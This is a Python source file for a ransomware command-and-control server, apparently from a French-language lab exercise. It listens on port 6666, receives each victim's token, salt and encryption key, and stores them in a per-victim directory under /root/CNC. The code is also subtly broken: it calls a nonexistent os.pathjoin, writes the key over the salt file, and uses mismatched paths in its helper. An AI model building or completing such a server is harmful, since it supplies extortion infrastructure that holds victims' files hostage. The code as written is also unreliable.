import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # 
        token = body["token"]
        salt = body["salt"]
        key = body["key"]
        token_unc= sha256(base64.b64decode(token)).hexdigest()
        victim_directory = os.pathjoin(CNC.ROOT_PATH, token_unc)
        os.makedirs(victim_directory, exist_ok=True)

        # Sauvegarde de la clé et du sel dans le dossier de la victime 
        with open(os.path.join(victim_directory,"salt"),"w") as salt_v:
            salt_v.write(salt)
        with open(os.path.join(victim_directory,"salt"),"w") as key_v:
            key_v.write(key)

        

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()